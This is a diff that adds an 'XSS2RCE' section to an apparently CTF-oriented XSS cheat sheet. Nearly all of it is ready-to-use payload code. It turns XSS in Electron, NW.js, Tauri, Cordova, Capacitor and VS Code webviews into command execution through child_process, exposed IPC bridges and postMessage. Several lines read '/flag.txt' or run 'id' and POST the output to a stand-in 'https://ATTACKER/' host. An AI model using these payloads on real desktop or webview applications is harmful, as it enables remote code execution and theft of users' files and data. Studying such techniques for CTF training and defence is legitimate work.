@@ -102,6 +102,108 @@ If a bot cookie is `SameSite=Lax`, embedding the target in an attacker iframe ma
 popup.postMessage({type:"debug", code:"fetch('/admin').then(r=>r.text()).then(t=>fetch('https://ATTACKER/',{method:'POST',body:t}))"}, "*")
 ```
 
+## XSS2RCE
+
+Use when XSS lands inside a desktop wrapper, admin bot with Node/Electron APIs, or a webview with a native bridge.
+
+Check runtime:
+
+```js
+typeof require
+typeof process
+process?.versions
+process?.versions?.electron
+navigator.userAgent
+Object.keys(window).filter(k => /electron|node|tauri|api|bridge|ipc|native|vscode|cordova/i.test(k))
+```
+
+Electron / NW.js direct Node:
+
+```js
+require('child_process').execSync('id').toString()
+window.require('child_process').execSync('id').toString()
+process.mainModule.require('child_process').execSync('id').toString()
+module.constructor._load('child_process').execSync('id').toString()
+require('fs').readFileSync('/flag.txt','utf8')
+```
+
+HTML payload:
+
+```html
+<img src=x onerror="fetch('https://ATTACKER/',{method:'POST',body:require('child_process').execSync('id').toString()})">
+<script>fetch('https://ATTACKER/',{method:'POST',body:require('fs').readFileSync('/flag.txt','utf8')})</script>
+```
+
+If output is visible:
+
+```html
+<script>document.body.innerText=require('child_process').execSync('cat /flag.txt').toString()</script>
+```
+
+Preload / IPC bridge:
+
+```js
+Object.keys(window)
+for (const k of Object.keys(window)) console.log(k, window[k])
+```
+
+Try common bridge names and actions:
+
+```js
+api.exec?.('id')
+api.run?.('id')
+api.open?.('/flag.txt')
+electronAPI.exec?.('id')
+electronAPI.readFile?.('/flag.txt')
+window.native?.exec?.('id')
+window.bridge?.send?.('exec', 'id')
+window.ipcRenderer?.send?.('exec', 'id')
+window.ipcRenderer?.invoke?.('exec', 'id').then(console.log)
+```
+
+postMessage to a preload listener:
+
+```js
+postMessage({type:'exec', cmd:'id'}, '*')
+postMessage({action:'readFile', path:'/flag.txt'}, '*')
+postMessage({type:'debug', code:"require('child_process').execSync('id').toString()"}, '*')
+```
+
+Electron exposed module but no `require`:
+
+```js
+electron.shell.openExternal('file:///flag.txt')
+electron.ipcRenderer.invoke('exec', 'id').then(x=>fetch('https://ATTACKER/',{method:'POST',body:x}))
+```
+
+Tauri / Cordova / Capacitor-style bridge:
+
+```js
+window.__TAURI__?.invoke?.('read_file', {path:'/flag.txt'}).then(console.log)
+window.__TAURI__?.shell?.Command?.create?.('id').execute().then(console.log)
+cordova?.exec?.(console.log, console.log, 'File', 'readAsText', ['/flag.txt'])
+Capacitor?.Plugins?.Filesystem?.readFile?.({path:'/flag.txt'}).then(console.log)
+```
+
+VS Code webview:
+
+```js
+const vscode = acquireVsCodeApi()
+vscode.postMessage({type:'exec', command:'id'})
+vscode.postMessage({type:'open', path:'/flag.txt'})
+location = 'command:workbench.action.terminal.new'
+```
+
+Triage questions:
+
+```text
+1. Is Node available directly? require/process/module/window.require.
+2. Is a preload bridge exposed? enumerate window keys.
+3. Is there ipcRenderer send/invoke? brute action names from app JS.
+4. Is file read enough? prefer fs/readFile over shell if flag is local.
+5. If only browser context exists, pivot through postMessage/opener/CORS instead.
+```
+
 ## Mutation XSS
 
 [https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
